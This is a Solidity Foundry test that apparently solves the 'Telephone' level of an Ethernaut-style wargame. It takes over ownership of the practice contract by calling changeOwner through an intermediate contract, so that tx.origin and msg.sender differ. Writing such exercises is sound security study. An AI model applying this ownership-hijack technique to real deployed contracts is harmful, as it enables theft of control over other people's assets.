// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/level04.sol";

contract AttackerTelephoneTest is Test {
    function testLevel04() external {
        vm.prank(address(0x1));
        Telephone level04 = new Telephone();

        console.log("Current Owner is: ", level04.owner());

        assertFalse(level04.owner() == msg.sender);
        level04.changeOwner(msg.sender);
        assertTrue(level04.owner() == msg.sender);

        console.log("New Owner is: ", level04.owner());
    }
}
